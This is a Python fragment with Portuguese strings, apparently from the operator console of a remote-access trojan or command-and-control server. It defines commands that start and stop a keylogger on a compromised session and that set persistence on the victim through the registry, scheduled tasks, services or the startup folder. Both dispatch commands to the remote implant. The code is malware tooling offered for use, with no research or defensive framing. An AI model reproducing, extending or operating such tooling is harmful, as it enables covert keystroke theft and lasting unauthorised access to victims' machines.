def keylogger_command(server, args):
    """Comando para controlar keylogger"""
    if len(args) < 2:
        server.console.print("[red]Uso: keylogger [id_sessão] [start|stop][/red]")
        return
        
    try:
        session_id = int(args[0])
        action = args[1]
        
        if action == "start":
            server.console.print("[yellow]Iniciando keylogger[/yellow]")
            server.send_command(session_id, "keylogger_start")
        elif action == "stop":
            server.console.print("[yellow]Parando keylogger[/yellow]")
            server.send_command(session_id, "keylogger_stop")
        else:
            server.console.print("[red]Ação deve ser 'start' ou 'stop'[/red]")
    except ValueError:
        server.console.print("[red]ID de sessão deve ser um número[/red]")

def persistence_command(server, args):
    """Comando para estabelecer persistência"""
    if len(args) < 2:
        server.console.print("[red]Uso: persistence [id_sessão] [method][/red]")
        server.console.print("[yellow]Métodos: registry, scheduled_task, service, startup[/yellow]")
        return
        
    try:
        session_id = int(args[0])
        method = args[1]
        
        methods = {
            'registry': 'Estabelecer persistência via registro',
            'scheduled_task': 'Estabelecer persistência via tarefa agendada',
            'service': 'Estabelecer persistência via serviço',
            'startup': 'Estabelecer persistência via pasta de inicialização'
        }
        
        if method not in methods:
            server.console.print(f"[red]Método inválido: {method}[/red]")
            server.console.print(f"[yellow]Métodos disponíveis: {', '.join(methods.keys())}[/yellow]")
            return
            
        server.console.print(f"[yellow]{methods[method]}[/yellow]")
        server.send_command(session_id, f"persistence_{method}")
    except ValueError:
        server.console.print("[red]ID de sessão deve ser um número[/red]")
